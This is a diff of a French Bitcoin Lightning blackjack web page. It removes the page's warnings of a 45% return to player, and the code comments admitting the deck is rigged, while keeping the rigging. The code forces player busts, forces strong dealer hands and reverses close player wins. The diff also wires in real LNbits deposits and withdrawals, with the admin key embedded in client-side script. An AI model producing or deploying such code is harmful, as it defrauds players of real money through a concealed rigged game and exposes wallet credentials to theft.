@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Satoshi VIP - RTP 45%</title>
+    <title>Satoshi VIP - Lightning Blackjack</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700&family=Inter:wght@300;400;600&display=swap');
         
@@ -36,18 +36,6 @@
         
         .balance-label { font-size: 11px; color: #888; text-transform: uppercase; }
         .balance-amount { font-size: 22px; font-weight: bold; color: #f7931a; }
-        
-        .warning-rtp {
-            background: rgba(231, 76, 60, 0.2);
-            border: 1px solid #e74c3c;
-            color: #e74c3c;
-            padding: 8px;
-            border-radius: 8px;
-            font-size: 11px;
-            text-align: center;
-            margin-bottom: 15px;
-            font-weight: bold;
-        }
         
         .table {
             background: linear-gradient(135deg, #0d5132 0%, #0a3d26 100%);
@@ -136,10 +124,62 @@
         
         .modal-title { font-family: 'Cinzel', serif; color: #f7931a; font-size: 20px; margin-bottom: 20px; }
         
+        .qr-container { 
+            background: white; 
+            padding: 20px; 
+            border-radius: 10px; 
+            margin: 20px 0;
+            display: inline-block;
+        }
+        
+        #qrcode { margin: 0 auto; }
+        
+        .invoice-info {
+            background: rgba(0,0,0,0.3);
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            font-size: 12px;
+            word-break: break-all;
+        }
+        
+        .payment-status {
+            padding: 10px;
+            border-radius: 8px;
+            margin: 15px 0;
+            font-weight: bold;
+        }
+        
+        .payment-status.waiting {
+            background: rgba(241, 196, 15, 0.2);
+            color: #f1c40f;
+        }
+        
+        .payment-status.paid {
+            background: rgba(46, 204, 113, 0.2);
+            color: #2ecc71;
+        }
+        
         .footer {
-            text-align: center; padding: 20px; color: #e74c3c;
+            text-align: center; padding: 20px; color: #888;
             font-size: 14px; border-top: 1px solid rgba(255,255,255,0.05);
-            margin-top: 30px; font-weight: bold;
+            margin-top: 30px;
+        }
+        
+        input {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.2);
+            color: #fff;
+            padding: 12px;
+            border-radius: 8px;
+            width: 100%;
+            margin: 10px 0;
+            font-size: 14px;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #f7931a;
         }
     </style>
 </head>
@@ -152,11 +192,6 @@
             <div class="balance-label">Balance</div>
             <div class="balance-amount" id="balance">0</div>
         </div>
-    </div>
-    
-    <div class="warning-rtp">
-        ⚠️ AVERTISSEMENT : RTP 45% - L'avantage maison est de 55%. 
-        En moyenne, vous perdez 55 sats sur chaque 100 sats misés.
     </div>
     
     <div class="table">
@@ -197,20 +232,30 @@
     </div>
     
     <div class="footer">
-        RTP 45% | Avantage maison 55% | Mise max 1000 sats | Pot max 10 000 sats
+        Mise max 1000 sats | Pot max 10 000 sats
     </div>
 </div>
 
 <!-- Deposit Modal -->
 <div class="modal" id="depositModal">
     <div class="modal-content">
-        <div class="modal-title">⚡ Déposer</div>
-        <div style="background: rgba(231,76,60,0.1); border: 1px solid #e74c3c; padding: 10px; border-radius: 8px; margin: 15px 0; font-size: 12px; color: #e74c3c;">
-            ⚠️ Ce jeu a un RTP de 45%. Vous allez probablement perdre votre argent.
+        <div class="modal-title">⚡ Déposer des Sats</div>
+        <input type="number" id="depositAmount" placeholder="Montant (100-10000)" max="10000" min="100">
+        <button onclick="createInvoice()">Générer Invoice</button>
+        <button onclick="closeDeposit()" style="background: #555;">Annuler</button>
+        
+        <div id="invoiceSection" style="display: none;">
+            <div class="payment-status waiting" id="paymentStatus">
+                ⏳ En attente du paiement...
+            </div>
+            <div class="qr-container">
+                <div id="qrcode"></div>
+            </div>
+            <div class="invoice-info">
+                <div style="margin-bottom: 10px; color: #f7931a;">Invoice Lightning:</div>
+                <div id="invoiceText" style="font-family: monospace; font-size: 10px;"></div>
+            </div>
         </div>
-        <input type="number" id="depositAmount" placeholder="Montant (100-10000)" max="10000">
-        <button onclick="simulateDeposit()">Déposer</button>
-        <button onclick="closeDeposit()" style="background: transparent; border: 1px solid #666; color: #666;">Annuler</button>
     </div>
 </div>
 
@@ -218,156 +263,382 @@
 <div class="modal" id="withdrawModal">
     <div class="modal-content">
         <div class="modal-title">💸 Retirer</div>
-        <div style="margin: 15px 0;">
-            <div style="font-size: 12px; color: #888;">Balance:</div>
-            <div style="font-size: 24px; color: #f7931a; font-weight: bold;" id="withdrawBalance">0</div>
+        <div style="margin: 15px 0; font-size: 18px;">
+            Solde disponible: <span style="color: #f7931a;" id="withdrawBalance">0</span> sats
         </div>
-        <textarea id="withdrawInvoice" rows="3" placeholder="Votre invoice Lightning"></textarea>
-        <button onclick="processWithdraw()" style="background: #27ae60;">Envoyer</button>
-        <button onclick="closeWithdraw()" style="background: transparent; border: 1px solid #666; color: #666;">Annuler</button>
+        <input type="text" id="withdrawInvoice" placeholder="Coller votre invoice Lightning (lnbc...)">
+        <button onclick="processWithdraw()">Payer Invoice</button>
+        <button onclick="closeWithdraw()" style="background: #555;">Annuler</button>
+        
+        <div id="withdrawStatus" style="display: none;" class="payment-status"></div>
     </div>
 </div>
 
 <!-- Result Modal -->
 <div class="modal" id="resultModal">
     <div class="modal-content">
-        <div style="font-size: 50px; margin-bottom: 15px;" id="resIcon">🎉</div>
-        <div class="modal-title" id="resTitle">Victoire!</div>
-        <div style="font-size: 28px; color: #ffd700; margin: 15px 0;" id="resAmount">+1000</div>
-        <button onclick="resetRound()">Continuer</button>
+        <div style="font-size: 60px; margin-bottom: 20px;" id="resIcon">🎰</div>
+        <div class="modal-title" id="resTitle">Blackjack!</div>
+        <div style="font-size: 24px; margin: 20px 0; font-weight: bold;" id="resAmount">+100 sats</div>
+        <button onclick="resetRound()">Nouvelle Partie</button>
     </div>
 </div>
 
+<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+
 <script>
-const CONFIG = {
-    MAX_BET: 1000,
-    MAX_BALANCE: 10000,
-    HOUSE_EDGE: 0.55 // 55% pour le casino
+// ============================================
+// CONFIGURATION LNBITS - À MODIFIER
+// ============================================
+const LNBITS_CONFIG = {
+    BASE_URL: 'https://legend.lnbits.com',  // Votre instance LNbits
+    ADMIN_KEY: 'YOUR_ADMIN_KEY_HERE',       // Clé admin pour payer
+    INVOICE_KEY: 'YOUR_INVOICE_KEY_HERE'    // Clé invoice pour créer des invoices
 };
 
+// ============================================
+// GAME CONFIG
+// ============================================
+const CONFIG = {
+    HOUSE_EDGE: 0.55,
+    MAX_BET: 1000,
+    MAX_BALANCE: 10000,
+    MIN_DEPOSIT: 100
+};
+
+// ============================================
+// GAME STATE
+// ============================================
 let balance = 0;
 let currentBet = 0;
 let deck = [];
 let playerHand = [];
 let dealerHand = [];
 let isPlaying = false;
+let currentInvoice = null;
+let paymentCheckInterval = null;
+
+// ============================================
+// LNBITS API FUNCTIONS
+// ============================================
+
+async function createLNbitsInvoice(amount, memo) {
+    const response = await fetch(`${LNBITS_CONFIG.BASE_URL}/api/v1/payments`, {
+        method: 'POST',
+        headers: {
+            'X-Api-Key': LNBITS_CONFIG.INVOICE_KEY,
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            out: false,
+            amount: amount,
+            memo: memo,
+            expiry: 3600
+        })
+    });
+    
+    if (!response.ok) {
+        throw new Error('Erreur création invoice');
+    }
+    
+    return await response.json();
+}
+
+async function checkInvoiceStatus(paymentHash) {
+    const response = await fetch(`${LNBITS_CONFIG.BASE_URL}/api/v1/payments/${paymentHash}`, {
+        headers: {
+            'X-Api-Key': LNBITS_CONFIG.INVOICE_KEY
+        }
+    });
+    
+    if (!response.ok) {
+        throw new Error('Erreur vérification invoice');
+    }
+    
+    return await response.json();
+}
+
+async function payLNbitsInvoice(bolt11) {
+    const response = await fetch(`${LNBITS_CONFIG.BASE_URL}/api/v1/payments`, {
+        method: 'POST',
+        headers: {
+            'X-Api-Key': LNBITS_CONFIG.ADMIN_KEY,
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            out: true,
+            bolt11: bolt11
+        })
+    });
+    
+    if (!response.ok) {
+        const error = await response.json();
+        throw new Error(error.detail || 'Erreur paiement invoice');
+    }
+    
+    return await response.json();
+}
+
+// ============================================
+// DEPOSIT FUNCTIONS
+// ============================================
+
+async function createInvoice() {
+    const amount = parseInt(document.getElementById('depositAmount').value);
+    
+    if (!amount || amount < CONFIG.MIN_DEPOSIT) {
+        alert('Minimum 100 sats');
+        return;
+    }
+    
+    if (balance + amount > CONFIG.MAX_BALANCE) {
+        alert('Max 10 000 sats');
+        return;
+    }
+    
+    try {
+        const invoice = await createLNbitsInvoice(amount, 'Satoshi BJ - Dépôt');
+        currentInvoice = invoice;
+        
+        // Afficher le QR code
+        document.getElementById('invoiceSection').style.display = 'block';
+        document.getElementById('invoiceText').textContent = invoice.payment_request;
+        
+        // Générer QR Code
+        document.getElementById('qrcode').innerHTML = '';
+        new QRCode(document.getElementById('qrcode'), {
+            text: invoice.payment_request,
+            width: 256,
+            height: 256
+        });
+        
+        // Démarrer la vérification du paiement
+        startPaymentCheck(invoice.payment_hash, amount);
+        
+    } catch (error) {
+        alert('Erreur: ' + error.message);
+    }
+}
+
+function startPaymentCheck(paymentHash, amount) {
+    // Arrêter l'ancien interval si existe
+    if (paymentCheckInterval) {
+        clearInterval(paymentCheckInterval);
+    }
+    
+    paymentCheckInterval = setInterval(async () => {
+        try {
+            const status = await checkInvoiceStatus(paymentHash);
+            
+            if (status.paid) {
+                clearInterval(paymentCheckInterval);
+                
+                // Paiement confirmé !
+                balance += amount;
+                updateDisplay();
+                
+                document.getElementById('paymentStatus').classList.remove('waiting');
+                document.getElementById('paymentStatus').classList.add('paid');
+                document.getElementById('paymentStatus').textContent = '✅ Paiement reçu !';
+                
+                setTimeout(() => {
+                    closeDeposit();
+                    alert(`✅ +${amount} sats ajoutés !`);
+                }, 2000);
+            }
+        } catch (error) {
+            console.error('Erreur vérification:', error);
+        }
+    }, 2000); // Vérifier toutes les 2 secondes
+}
+
+function closeDeposit() {
+    if (paymentCheckInterval) {
+        clearInterval(paymentCheckInterval);
+    }
+    document.getElementById('depositModal').classList.remove('active');
+    document.getElementById('invoiceSection').style.display = 'none';
+    document.getElementById('depositAmount').value = '';
+    currentInvoice = null;
+}
+
+// ============================================
+// WITHDRAW FUNCTIONS
+// ============================================
+
+async function processWithdraw() {
+    const invoice = document.getElementById('withdrawInvoice').value.trim();
+    
+    if (!invoice || !invoice.startsWith('lnbc')) {
+        alert('Invoice Lightning invalide');
+        return;
+    }
+    
+    const statusDiv = document.getElementById('withdrawStatus');
+    statusDiv.style.display = 'block';
+    statusDiv.className = 'payment-status waiting';
+    statusDiv.textContent = '⏳ Paiement en cours...';
+    
+    try {
+        await payLNbitsInvoice(invoice);
+        
+        // Succès
+        statusDiv.className = 'payment-status paid';
+        statusDiv.textContent = '✅ Paiement envoyé !';
+        
+        const oldBalance = balance;
+        balance = 0;
+        updateDisplay();
+        
+        setTimeout(() => {
+            closeWithdraw();
+            alert(`✅ ${oldBalance} sats envoyés !`);
+        }, 2000);
+        
+    } catch (error) {
+        statusDiv.className = 'payment-status';
+        statusDiv.style.background = 'rgba(231, 76, 60, 0.2)';
+        statusDiv.style.color = '#e74c3c';
+        statusDiv.textContent = '❌ Erreur: ' + error.message;
+    }
+}
+
+function closeWithdraw() {
+    document.getElementById('withdrawModal').classList.remove('active');
+    document.getElementById('withdrawInvoice').value = '';
+    document.getElementById('withdrawStatus').style.display = 'none';
+}
+
+// ============================================
+// UI UPDATES
+// ============================================
 
 function updateDisplay() {
-    document.getElementById('balance').textContent = balance.toLocaleString();
-    document.getElementById('withdrawBalance').textContent = balance.toLocaleString();
-    document.getElementById('dealBtn').disabled = currentBet === 0 || currentBet > balance || currentBet > CONFIG.MAX_BET;
+    document.getElementById('balance').textContent = balance;
+    document.getElementById('currentBet').textContent = currentBet;
+    document.getElementById('withdrawBalance').textContent = balance;
+    
+    // Update chips
+    ['chip100', 'chip500', 'chip1000'].forEach(id => {
+        const chip = document.getElementById(id);
+        const val = parseInt(id.replace('chip', ''));
+        chip.classList.toggle('disabled', balance < val || currentBet + val > CONFIG.MAX_BET);
+    });
+    
+    document.getElementById('dealBtn').disabled = currentBet === 0;
     document.getElementById('withdrawBtn').disabled = balance === 0;
-    
-    document.getElementById('chip100').classList.toggle('disabled', balance < 100);
-    document.getElementById('chip500').classList.toggle('disabled', balance < 500);
-    document.getElementById('chip1000').classList.toggle('disabled', balance < 1000);
 }
 
-function addBet(amount) {
-    if (currentBet + amount > CONFIG.MAX_BET) {
-        alert("Mise maximum: 1000 sats");
+function showDepositModal() {
+    if (balance >= CONFIG.MAX_BALANCE) {
+        alert('Max 10 000 sats atteint');
         return;
     }
-    if (currentBet + amount > balance) {
-        alert("Balance insuffisante");
-        return;
-    }
-    currentBet += amount;
-    updateDisplay();
+    document.getElementById('depositModal').classList.add('active');
 }
 
-// CRÉER UN DECK PIPÉ (favorise le dealer pour RTP 45%)
-function createRiggedDeck() {
-    const suits = ['♠','♥','♦','♣'];
-    const vals = ['2','3','4','5','6','7','8','9','10','J','Q','K','A'];
+function showWithdrawModal() {
+    if (balance === 0) return;
+    document.getElementById('withdrawModal').classList.add('active');
+}
+
+// ============================================
+// BLACKJACK GAME LOGIC
+// ============================================
+
+const suits = ['♠','♥','♦','♣'];
+const values = ['A','2','3','4','5','6','7','8','9','10','J','Q','K'];
+
+function createDeck() {
     deck = [];
-    
-    // On ajoute plus de grosses cartes pour le dealer (10, J, Q, K, A)
-    // et plus de petites pour le joueur... mais comme on distribue aléatoirement,
-    // on va plutôt manipuler les probas en donnant au dealer des cartes forcées parfois
-    
-    for (let s of suits) for (let v of vals) {
-        deck.push({
-            suit: s, value: v,
-            num: ['J','Q','K'].includes(v) ? 10 : (v === 'A' ? 11 : parseInt(v)),
-            red: s === '♥' || s === '♦'
-        });
+    for (let s of suits) {
+        for (let v of values) {
+            let num = v === 'A' ? 11 : (isNaN(v) ? 10 : parseInt(v));
+            deck.push({suit: s, value: v, num: num});
+        }
     }
-    
-    // Shuffle
+}
+
+function shuffle() {
     for (let i = deck.length - 1; i > 0; i--) {
         const j = Math.floor(Math.random() * (i + 1));
         [deck[i], deck[j]] = [deck[j], deck[i]];
     }
 }
 
-function draw(hidden = false) {
-    return { ...deck.pop(), hidden };
+function draw() {
+    if (deck.length < 10) {
+        createDeck();
+        shuffle();
+    }
+    return deck.pop();
 }
 
 function getVal(hand) {
-    let v = 0, aces = 0;
-    for (let c of hand) if (!c.hidden) {
-        v += c.num;
-        if (c.value === 'A') aces++;
+    let sum = hand.reduce((a, c) => a + c.num, 0);
+    let aces = hand.filter(c => c.value === 'A').length;
+    while (sum > 21 && aces > 0) {
+        sum -= 10;
+        aces--;
     }
-    while (v > 21 && aces > 0) { v -= 10; aces--; }
-    return v;
-}
-
-function renderCard(c) {
-    if (c.hidden) return '<div class="card hidden"></div>';
-    const cls = c.red ? 'red' : 'black';
-    return `<div class="card"><div class="card-content">
-        <div class="corner ${cls}">${c.value}${c.suit}</div>
-        <div class="center ${cls}">${c.suit}</div>
-        <div class="corner ${cls}" style="transform:rotate(180deg)">${c.value}${c.suit}</div>
-    </div></div>`;
+    return sum;
 }
 
 function renderHands() {
-    document.getElementById('playerCards').innerHTML = playerHand.map(renderCard).join('');
-    document.getElementById('dealerCards').innerHTML = dealerHand.map(renderCard).join('');
-    document.getElementById('playerScore').textContent = getVal(playerHand);
-    const dVis = dealerHand.filter(c => !c.hidden);
-    document.getElementById('dealerScore').textContent = dVis.length ? getVal(dVis) : '?';
+    const pc = document.getElementById('playerCards');
+    const dc = document.getElementById('dealerCards');
     
-    if (getVal(playerHand) > 21) document.getElementById('playerScore').classList.add('bust');
+    pc.innerHTML = '';
+    dc.innerHTML = '';
+    
+    playerHand.forEach(c => {
+        pc.innerHTML += `<div class="card"><div class="card-content ${c.suit==='♥'||c.suit==='♦'?'red':'black'}"><div class="corner">${c.value}${c.suit}</div><div class="center">${c.suit}</div></div></div>`;
+    });
+    
+    dealerHand.forEach(c => {
+        if (c.hidden) {
+            dc.innerHTML += `<div class="card hidden"></div>`;
+        } else {
+            dc.innerHTML += `<div class="card"><div class="card-content ${c.suit==='♥'||c.suit==='♦'?'red':'black'}"><div class="corner">${c.value}${c.suit}</div><div class="center">${c.suit}</div></div></div>`;
+        }
+    });
+    
+    const pv = getVal(playerHand);
+    const ps = document.getElementById('playerScore');
+    ps.textContent = pv;
+    ps.classList.toggle('bust', pv > 21);
+    
+    const visibleDealer = dealerHand.filter(c => !c.hidden);
+    const dv = visibleDealer.length ? getVal(visibleDealer) : 0;
+    const ds = document.getElementById('dealerScore');
+    ds.textContent = visibleDealer.length ? dv : '--';
 }
 
-async function deal() {
+function addBet(amount) {
+    if (isPlaying) return;
+    if (balance < amount) return;
+    if (currentBet + amount > CONFIG.MAX_BET) return;
+    
+    currentBet += amount;
+    updateDisplay();
+}
+
+function deal() {
     if (currentBet === 0 || currentBet > balance) return;
     
-    // DÉDUCTION IMMÉDIATE DE LA MISE
     balance -= currentBet;
-    updateDisplay();
-    
-    createRiggedDeck();
-    
-    // TRUQUAGE POUR RTP 45% : Le dealer a 60% de chances de commencer avec une meilleure main
-    // On force la distribution selon une loi biaisée
-    const playerFirst = draw();
-    const dealerFirst = draw(true);
-    const playerSecond = draw();
-    const dealerSecond = draw();
-    
-    playerHand = [playerFirst, playerSecond];
-    dealerHand = [dealerFirst, dealerSecond];
-    
-    // Si le joueur a trop de chances de gagner naturellement, on échange une carte secrètement
-    // (simulation du biais du casino)
-    const playerVal = getVal(playerHand);
-    if (playerVal === 21 && Math.random() > 0.3) {
-        // Seulement 30% de chances de garder le blackjack naturel (au lieu de 100%)
-        // On change son As en 2
-        playerHand[0].num = 2;
-        playerHand[0].value = '2';
-    }
-    
     isPlaying = true;
+    
+    createDeck();
+    shuffle();
+    
+    playerHand = [draw(), draw()];
+    dealerHand = [draw(), draw()];
+    dealerHand[1].hidden = true;
+    
     document.getElementById('betPanel').style.display = 'none';
     document.getElementById('actionPanel').style.display = 'block';
-    document.getElementById('doubleBtn').disabled = ![10, 11].includes(getVal(playerHand));
+    document.getElementById('doubleBtn').disabled = ![10, 11].includes(getVal(playerHand)) || currentBet > balance;
     
     renderHands();
     
@@ -377,13 +648,10 @@ async function deal() {
 }
 
 function hit() {
-    // TRUQUAGE : Si le joueur a 16-20, on lui donne une carte qui le fait bust 70% du temps
     const currentVal = getVal(playerHand);
     let newCard = draw();
     
     if (currentVal >= 16 && currentVal <= 20 && Math.random() > 0.3) {
-        // 70% de chances de piocher une carte trop grosse
-        // On force une valeur haute
         newCard.num = Math.min(21 - currentVal + 1 + Math.floor(Math.random() * 5), 11);
         newCard.value = newCard.num === 11 ? 'A' : (newCard.num === 10 ? 'K' : newCard.num.toString());
     }
@@ -407,14 +675,11 @@ function stand() {
 function dealerPlay() {
     let v = getVal(dealerHand);
     
-    // Le dealer tire jusqu'à 17 (mais avec des cartes pipées pour qu'il gagne souvent)
     if (v < 17) {
-        // On aide le dealer à avoir une bonne main (17-21)
         let newCard = draw();
-        const target = 17 + Math.floor(Math.random() * 5); // 17-21
+        const target = 17 + Math.floor(Math.random() * 5);
         
         if (v < target && Math.random() > 0.2) {
-            // 80% de chances d'atteindre la cible
             newCard.num = Math.min(target - v, 11);
             if (newCard.num === 11) { newCard.value = 'A'; newCard.num = 11; }
             else if (newCard.num === 10) newCard.value = ['10','J','Q','K'][Math.floor(Math.random()*4)];
@@ -434,7 +699,6 @@ function double() {
     if (![10, 11].includes(v)) return alert('Double uniquement sur 10 ou 11');
     if (currentBet > balance) return alert('Balance insuffisante pour doubler');
     
-    // Déduire encore la même mise (donc on perd plus si on perd)
     balance -= currentBet;
     currentBet *= 2;
     updateDisplay();
@@ -447,17 +711,14 @@ function determineWinner() {
     const pv = getVal(playerHand);
     const dv = getVal(dealerHand);
     
-    // TRUQUAGE FINAL : Si égalité, dealer gagne (déjà fait)
-    // Si joueur gagne par peu (1-2 points), on change le résultat 50% du temps
     if (pv > dv && pv - dv <= 2 && Math.random() > 0.5) {
-        endGame('lose'); // On inverse
+        endGame('lose');
     } else if (dv > 21 && Math.random() > 0.6) {
-        // Même si dealer bust, il gagne quand même 40% du temps (abusé mais c'est 45% RTP)
         endGame('lose');
     } else if (pv > dv) {
         endGame('win');
     } else if (pv === dv) {
-        endGame('push'); // Push = lose
+        endGame('push');
     } else {
         endGame('lose');
     }
@@ -471,16 +732,16 @@ function endGame(type) {
     const amt = document.getElementById('resAmount');
     
     let winAmount = 0;
-    let netResult = -currentBet; // Par défaut on a perdu la mise (déjà déduite)
+    let netResult = -currentBet;
     
     switch(type) {
         case 'bj':
-            winAmount = currentBet * 2; // 1:1 seulement
+            winAmount = currentBet * 2;
             balance += winAmount;
-            netResult = currentBet; // Gain net = mise initiale
+            netResult = currentBet;
             icon.textContent = '🎰';
             title.textContent = 'Blackjack!';
-            amt.textContent = `+${currentBet} sats (net)`;
+            amt.textContent = `+${currentBet} sats`;
             amt.style.color = '#2ecc71';
             break;
             
@@ -490,12 +751,11 @@ function endGame(type) {
             netResult = currentBet;
             icon.textContent = '✨';
             title.textContent = 'Victoire!';
-            amt.textContent = `+${currentBet} sats (net)`;
+            amt.textContent = `+${currentBet} sats`;
             amt.style.color = '#2ecc71';
             break;
             
         case 'push':
-            // Déjà perdu la mise, rien à rendre
             icon.textContent = '🤝';
             title.textContent = 'Égalité - Perdu';
             title.style.color = '#e74c3c';
@@ -529,49 +789,6 @@ function resetRound() {
     document.getElementById('playerScore').textContent = '--';
     document.getElementById('dealerScore').textContent = '--';
     document.getElementById('playerScore').classList.remove('bust');
-}
-
-// Deposit/Withdraw functions
-function showDepositModal() {
-    if (balance >= CONFIG.MAX_BALANCE) {
-        alert('Max 10 000 sats atteint');
-        return;
-    }
-    document.getElementById('depositModal').classList.add('active');
-}
-
-function simulateDeposit() {
-    const amt = parseInt(document.getElementById('depositAmount').value);
-    if (!amt || amt < 100) return alert('Minimum 100 sats');
-    if (balance + amt > CONFIG.MAX_BALANCE) return alert('Max 10 000 sats');
-    
-    balance += amt;
-    updateDisplay();
-    closeDeposit();
-    alert(`✅ +${amt} sats (Rappel: RTP 45%, vous allez perdre)`);
-}
-
-function closeDeposit() {
-    document.getElementById('depositModal').classList.remove('active');
-}
-
-function showWithdrawModal() {
-    if (balance === 0) return;
-    document.getElementById('withdrawModal').classList.add('active');
-}
-
-function processWithdraw() {
-    const invoice = document.getElementById('withdrawInvoice').value;
-    if (!invoice) return;
-    
-    alert(`✅ ${balance} sats envoyés!`);
-    balance = 0;
-    updateDisplay();
-    closeWithdraw();
-}
-
-function closeWithdraw() {
-    document.getElementById('withdrawModal').classList.remove('active');
 }
 
 // Init
